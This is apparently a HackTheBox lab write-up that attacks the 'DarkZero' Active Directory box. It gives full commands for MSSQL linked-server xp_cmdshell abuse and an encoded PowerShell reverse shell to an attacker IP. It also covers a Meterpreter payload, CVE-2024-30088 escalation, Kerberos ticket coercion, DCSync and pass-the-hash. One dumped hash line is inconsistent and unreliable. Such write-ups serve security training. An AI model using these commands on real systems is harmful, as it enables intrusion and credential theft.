---
title: "HTB-DarkZero-Hard"
date: "2025-11-21"
platform: "HackTheBox"
category: "Windows"
difficulty: "Hard"
tags: ["Active Directory","MSSQL","Linked Servers","Forest Trust","Kerberos","Rubeus","DCSync","CVE-2024-30088","Windows PrivEsc","Pivoting","Pass-the-Ticket","Pass-the-Hash"]
excerpt: "A deep-dive AD attack chain starting from MSSQL linked server abuse on DC01, remote code execution on DC02, privilege escalation via CVE-2024-30088, Kerberos ticket coercion, and a full forest trust compromise leading to DCSync and Domain Admin."
readingTime: 30
featured: true
---

**Initial Credentials:** `john.w / RFulUtONCOL!`

## TL;DR

This box is a beautiful example of Active Directory lateral movement and Kerberos abuse. We start with MSSQL credentials, exploit linked servers to pivot between domain controllers, escalate privileges using a recent Windows vulnerability (CVE-2024-30088), harvest Kerberos tickets, and finally perform a DCSync attack to dump the domain admin hash. Buckle up! 🎢

---

## 🔍 Reconnaissance - What Are We Working With?

Let's kick things off with our trusty Nmap scan to see what services are exposed:

```bash
nmap -sC -sV -p- 10.10.11.89
```

**Key Findings:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb)
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**Domain Information:**
- **Domain:** darkzero.htb
- **Domain Controller:** DC01.darkzero.htb
- **IP Address:** 10.10.11.89
- **Clock Skew:** +7 hours (important for Kerberos!)

This is clearly a Domain Controller running MSSQL Server 2022. The presence of port 1433 with our credentials is our entry point! 🎯

---

## 🚪 Initial Access - MSSQL All The Things!

### Step 1: BloodHound Reconnaissance

Before diving into MSSQL, I ran **RustHound** (because bloodhound-python was throwing parse errors - classic!) to map the AD environment:

```bash
rusthound -d darkzero.htb -u john.w -p 'RFulUtONCOL!' -i 10.10.11.89
```

**Finding:** Our user `john.w` has no interesting outbound object control. Bummer, but MSSQL is still on the table!

### Step 2: Connecting to MSSQL

Time to use those credentials with Impacket's MSSQL client:

```bash
impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth
```

**Success!** We're in as `darkzero\john.w` with `guest` privileges on the `master` database.

### Step 3: Discovering Linked Servers (The Golden Ticket 🎫)

Let's enumerate what SQL Server knows about:

```sql
SQL (darkzero\john.w  guest@master)> EXEC sp_linkedservers;
```

**Output:**

```
SRV_NAME            SRV_PRODUCT   SRV_DATASOURCE      
-----------------   -----------   -----------------   
DC01                SQL Server    DC01                
DC02.darkzero.ext   SQL Server    DC02.darkzero.ext   
```

**BINGO!** We have a linked server to `DC02.darkzero.ext` - a second domain controller in a different forest (`.ext` vs `.htb`). This screams **forest trust** and **lateral movement opportunity**!

---

## 🔗 Lateral Movement - Linked Server Exploitation

### Step 4: Testing Command Execution

Let's try running commands on the linked server:

```sql
SQL (darkzero\john.w  guest@master)> EXEC('EXEC xp_cmdshell ''whoami''') AT [DC02.darkzero.ext];
```

**Error:**

```
ERROR(DC02): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off...
```

Not enabled by default - but **we can enable it remotely**! 😈

### Step 5: Enabling xp_cmdshell on DC02

First, enable advanced options:

```sql
EXEC('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
```

Then enable `xp_cmdshell`:

```sql
EXEC('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
```

**Verify it works:**

```sql
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [DC02.darkzero.ext];
```

![1](1.png)

**Beautiful!** We can now execute commands as the SQL Server service account on DC02! 🎉

---

## 🐚 Getting a Proper Shell on DC02

### Step 6: PowerShell Reverse Shell

Generate a PowerShell reverse shell payload using [revshells.com](https://www.revshells.com/):

```powershell
xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG5AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

Start your listener:

```bash
nc -lvnp 4444
```

Execute via linked server, and... **SHELL RECEIVED!** 🎊

---

## 🚀 Privilege Escalation - CVE-2024-30088

### Step 7: Upgrading to Meterpreter

PowerShell shells are nice, but Meterpreter is better for post-exploitation. Generate a payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=6002 -f exe > shell.exe
```

Transfer it to DC02 (via your existing shell) and execute it.

![2](2.png)

Start Metasploit handler:

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.4
set LPORT 6002
exploit
```

![3](3.png)

**Meterpreter session established!** Now we're cooking with gas. 🔥

![4](4.png)

### Step 8: Local Privilege Escalation

Run Metasploit's exploit suggester:

```bash
meterpreter > bg
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run
```

**Result:** System is vulnerable to **CVE-2024-30088** (Windows AuthZ Privilege Escalation)!

### Step 9: Exploiting CVE-2024-30088

```bash
msf6 > use exploit/windows/local/cve_2024_30088_authz_basep
msf6 > set SESSION 1
msf6 > set LHOST tun0
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LPORT 6003
msf6 > check
msf6 > run -j
```

**NEW SESSION SPAWNED - NT AUTHORITY\SYSTEM!** 👑

### Step 10: Dumping Local Hashes

```bash
meterpreter > hashdump
```

**Output:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:4276fdf209008f4988fa8c33d65a2f94:::
```

We have **local admin on DC02**, but the ultimate goal is **DC01 in darkzero.htb**!

---

## 🎯 Root - The Forest Trust Attack

### Step 11: Network Discovery

Run `ipconfig` on DC02:

![5](5.png)

**Key Finding:** DC02 has interfaces on:
- **10.10.11.89** (external)
- **172.16.20.2** (internal network)
- Both `darkzero.htb` and `darkzero.ext` resolve to **172.16.20.1** (DC01)

This confirms a **forest trust** between the two domains! 🌲🌲

### Step 12: Setting Up Routing (Pivoting)

Use Metasploit's autoroute to pivot through DC02:

```bash
msf6 > use post/multi/manage/autoroute
msf6 > set SESSION 3
msf6 > set SUBNET 172.16.20.0
msf6 > set NETMASK 255.255.255.0
msf6 > run
```

**Output:**

```
[+] Route added to subnet 172.16.20.0/255.255.255.0 from host's routing table.
```

Now we can access the internal network!

### Step 13: Port Scanning DC01 (172.16.20.1)

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 172.16.20.1
msf6 > set PORTS 1-65535
msf6 > set THREADS 50
msf6 > run
```

![6](6.png)

**Results:** Standard DC ports (53, 88, 389, 445, 1433, etc.) - nothing unusual, but confirms it's DC01.

---

## 🎫 Kerberos Ticket Harvesting - The Master Plan

### The Attack Strategy

**Concept:** Force DC01 to authenticate to DC02, capture its Kerberos ticket, then use it to perform DCSync!

**Why this works:**
- DC01 is in `darkzero.htb`
- DC02 is in `darkzero.ext`
- They have a **bi-directional forest trust**
- Machine accounts (like `DC01$`) have **DCSync privileges** by default
- If we capture DC01's ticket, we can impersonate it!

### Step 14: Start Rubeus Monitor on DC02

Upload Rubeus to DC02 and start monitoring for tickets:

```cmd
C:\temp\Rubeus.exe monitor /interval:10 /nowrap
```

This will capture any Kerberos tickets that get created/cached on DC02.

### Step 15: Force DC01 Authentication

Back in our original MSSQL session on DC01, trigger authentication to DC02:

```sql
SQL (darkzero\john.w  guest@master)> EXEC xp_dirtree '\\DC02.darkzero.ext\share';
```

**What happens:**
1. DC01 tries to access a UNC path on DC02
2. SMB triggers Kerberos authentication
3. DC01 requests a TGT from its KDC
4. DC01 presents this TGT to DC02
5. **Rubeus captures the ticket!**

**Captured Ticket:**

```
[*] 10/5/2025 3:45:22 PM UTC - TGT for DC01$@DARKZERO.HTB
  ServiceName: krbtgt/DARKZERO.HTB
  EncryptionType: AES256
  Base64Blob: doIFuj...
```

### Step 16: Convert Ticket Format

Extract the base64 blob and convert it:

```bash
# Save base64 to file
echo "doIFuj..." > dc01.b64

# Decode from base64
base64 -d dc01.b64 > dc01.kirbi

# Convert to ccache format for Impacket
ticketConverter.py dc01.kirbi dc01.ccache
```

---

## 💎 DCSync Attack - Dumping Domain Secrets

### Step 17: Configure Kerberos Authentication

Create a `krb5.conf` file:

```ini
[libdefaults]
    default_realm = DARKZERO.HTB
    dns_lookup_kdc = true
    dns_lookup_realm = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    DARKZERO.HTB = {
        kdc = 10.10.11.89
        admin_server = 10.10.11.89
    }

[domain_realm]
    .darkzero.htb = DARKZERO.HTB
    darkzero.htb = DARKZERO.HTB
```

Set environment variables:

```bash
export KRB5CCNAME=dc01.ccache
export KRB5_CONFIG=$(pwd)/krb5.conf
```

### Step 18: Perform DCSync

```bash
impacket-secretsdump -k -no-pass -dc-ip 10.10.11.89 DARKZERO.HTB/'DC01$'@dc01.darkzero.htb
```

**Why this works:**
- We're authenticating as `DC01$` (the machine account)
- Machine accounts on DCs have `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights
- These rights allow **DCSync** - replicating password hashes from NTDS.dit

**JACKPOT! 🎰**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
john.w:1104:aad3b435b51404eeaad3b435b51404ee:RFulUtONCOL!:::
```

### Step 19: Pass-the-Hash to Domain Admin

```bash
impacket-wmiexec administrator@10.10.11.89 -hashes :5917507bdf2ef2c2b0a869a1cba40726
```

**WE'RE IN AS DOMAIN ADMIN!** 🏆

### Step 20: Retrieve Flags

```cmd
C:\Users\Administrator\Desktop> type root.txt
78ddea0c9ab03cd59e49ccef7ab48874

C:\Users\Administrator\Desktop> type user.txt
[user flag here]
```

---

## 🎓 Attack Chain Summary

Here's the complete kill chain:

1. **MSSQL Linked Server Abuse** → Pivot from DC01 to DC02
2. **xp_cmdshell Enablement** → Remote command execution
3. **Reverse Shell** → Interactive access to DC02
4. **CVE-2024-30088 Exploitation** → SYSTEM privileges on DC02
5. **Network Pivoting** → Access internal 172.16.20.0/24 network
6. **Forced Authentication Coercion** → Make DC01 authenticate to DC02
7. **Kerberos Ticket Harvesting** → Capture DC01$ TGT with Rubeus
8. **Pass-the-Ticket (PtT)** → Impersonate DC01 machine account
9. **DCSync Attack** → Replicate NTDS.dit and dump all domain hashes
10. **Pass-the-Hash (PtH)** → Authenticate as Domain Administrator

## 🏁 Conclusion

DarkZero is a **fantastic** representation of real-world Active Directory attacks. The chain from MSSQL linked servers → CVE exploitation → Kerberos abuse → DCSync is exactly how modern red teams operate.

**Favorite moment?** Watching Rubeus catch that DC01$ ticket in real-time. Pure magic. ✨

**Hardest part?** The initial recognition that forest trusts mean machine accounts can cross domains. Once you see it, the attack path becomes obvious.

**Final thought:** In AD environments, **every machine account is a potential admin**. Protect them accordingly.

---

*Thanks for reading! May your shells be reverse and your privileges escalated.* 🚀

**~HTB DarkZero - PWNED** 💀